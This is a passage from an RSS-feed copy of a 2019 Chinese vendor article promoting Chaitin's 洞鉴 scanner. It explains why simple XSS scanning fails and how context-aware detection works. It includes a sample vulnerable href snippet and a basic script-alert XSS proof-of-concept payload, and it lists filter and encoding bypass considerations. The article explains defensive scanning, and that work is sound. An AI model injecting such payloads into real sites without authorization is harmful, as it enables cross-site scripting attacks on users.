class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;html&amp;gt;
 &amp;lt;body&amp;gt;
 &amp;lt;a href=&quot;./news/866f268a344ba71fa4b0/&quot;&amp;gt;
 &amp;lt;img src=&quot;./xxx.png&quot;&amp;gt;
 &amp;lt;/a&amp;gt;
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是一段可能存在 XSS 的代码，业务将用户输入的 p 参数输出到了 a 标签的 href 属性中。熟悉 XSS 的同学无需多想即可编写如下验证该漏洞的 Payload。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;自动化扫描工具只要覆盖这个 Payload 即可验证如上的漏洞。但是这个 Payload 真的能工作么？其实还需要考虑其他因素：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;参数是否会被服务器编码或解码&lt;/li&gt;&lt;li&gt;参数中是否允许存在空格，是否有长度限制&lt;/li&gt;&lt;li&gt;会不会有 WAF 拦截 script 或 alert 等关键字&lt;/li&gt;&lt;li&gt;( 和 ) 有没有可能被过滤或转义&lt;/li&gt;&lt;li&gt;&quot; 和 &#39; 有没有可能被过滤或转义&lt;/li&gt;&lt;li&gt;&amp;lt; 和 &amp;gt; 有没有可能被过滤或转义&lt;/li&gt;&lt;li&gt;有没有其他可以利用的属性，是否可以使用 onXXX 事件，有没有可能被过滤或转义&lt;/li&gt;&lt;li&gt;有没有 CSP 策略&lt;/li&gt;&lt;li&gt;等等&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;如果是传统自动化黑盒扫描器，包含如上文“无需多想”的 Payload 已属不易，以上意外因素只要存在一点就可以使扫描铩羽而归，更难想想需要累积并尝试多少 Payload 才能实际验证一个这样的 XSS 漏洞。&lt;/p&gt;&lt;p&gt;想要精细化发现 XSS 漏洞，必须站在理解 DOM 结构的基础上，长亭洞鉴实现了兼容各种浏览器标准的 DOM 解析器，使可分析的参数输出点可以覆盖到包括但不限于以下范围：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;输出在标签外部&lt;/li&gt;&lt;li&gt;输出在 HTML 注释中&lt;/li&gt;&lt;li&gt;输出在标签的属性内部&lt;/li&gt;&lt;li&gt;输出在标签的属性外部&lt;/li&gt;&lt;li&gt;输出在标签的事件内部&lt;/li&gt;&lt;li&gt;输出在地址的部位，如 a/href、form/action、iframe/src 等&lt;/li&gt;&lt;li&gt;输出在标签的 style 属性内部&lt;/li&gt;&lt;li&gt;输出在 style 标签内&lt;/li&gt;&lt;li&gt;输出在 script 标签内的字符串中&lt;/li&gt;&lt;li&gt;输出在 script 标签内的注释中&lt;/li&gt;&lt;li&gt;输出在特殊标签内部&lt;/li&gt;&lt;li&gt;输出在特殊标签的特殊属性内部&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;除此之外，自动化工具还需要理解参数传递方式与常见编码方式，考虑如何自动化识别服务器对参数的编码方式，如何定位 Payload 中的敏感字符，并对 Payload 关键部分进行编码。洞鉴内置的编码探测算法与自动编码算法可以解决该问题，可覆盖的编码类型包括但不限于：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;HTML Entity&lt;/li&gt;&lt;li&gt;HTML Code&lt;/li&gt;&lt;li&gt;HTML Hex Code&lt;/li&gt;&lt;li&gt;URL Encode&lt;/li&gt;&lt;li&gt;js string      literal&lt;/li&gt;&lt;li&gt;GBK&lt;/li&gt;&lt;li&gt;UTF-7&lt;/li&gt;&lt;li&gt;Base64&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;对于上文提到的漏洞，长亭洞鉴的发现过程会更加智能化，在理解业务的基础上进行深度分析，定位漏洞，并自动生成 Payload，简单模拟一遍，可以将发现过程简单理解如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;访问原始页面，判断输入是否会出现在页面上&lt;br&gt; 结论：参数 p 的内容会出现在页面上&lt;/li&gt;&lt;li&gt;根据 HTML 的语义建立 DOM 结构，判断输出在 DOM 中的位置&lt;br&gt; 结论：输出位于 a 标签的 href 属性中&lt;/li&gt;&lt;li&gt;输出是否需要冲突破闭合&lt;br&gt; 结论：href 属性在双引号内，因此需要使用 &quot; 突破闭合，也可以进一步使用 &amp;gt; 突破标签闭合&lt;/li&gt;&lt;li&gt;是否能插入可执行的 js&lt;br&gt; 结论：不存在其他干扰标签，可以使用 &quot; 突破闭合后插入标签事件或插入新的标签&lt;/li&gt;&lt;li&gt;基本确定 XSS 漏洞存在，开始尝试自动生成 Payload，生成 Payload 时需要考虑&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;洞鉴扫描截图如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;正在扫描的任务详情部分截取&lt;br&gt; &lt;/li&gt;&lt;/ol&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1bea0d6546081eeeb1f4d0f444d97b97_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;260&quot; class=&quot;content_image&quot; width=&quot;415&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1bea0d6546081eeeb1f4d0f444d97b97_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;260&quot; class=&quot;content_image lazy&quot; width=&quot;415&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-1bea0d6546081eeeb1f4d0f444d97b97_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;2. XSS 漏洞详情部分截取&lt;br&gt; &lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d577ff408f931064564c12b3d0ffd5f7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;327&quot; class=&quot;content_image&quot; width=&quot;415&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d577ff408f931064564c12b3d0ffd5f7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;327&quot; class=&quot;content_image lazy&quot; width=&quot;415&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d577ff408f931064564c12b3d0ffd5f7_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;传统的 XSS 扫描简单粗暴，无法实现“全面发现 XSS 漏洞”的目标。&lt;/p&gt;&lt;p&gt;长亭洞鉴集成了基于智能化场景分析算法的扫描引擎，可以精确定位参数的输出，覆盖不同场景的多种 XSS 漏洞，从而实现对 XSS 漏洞进行快速、深度、精准地探测。&lt;/p&gt;&lt;p&gt;感兴趣的同学可以打开长亭官网点击试用，了解更多的产品详情。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-01-12-54732352</guid>
<pubDate>Sat, 12 Jan 2019 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
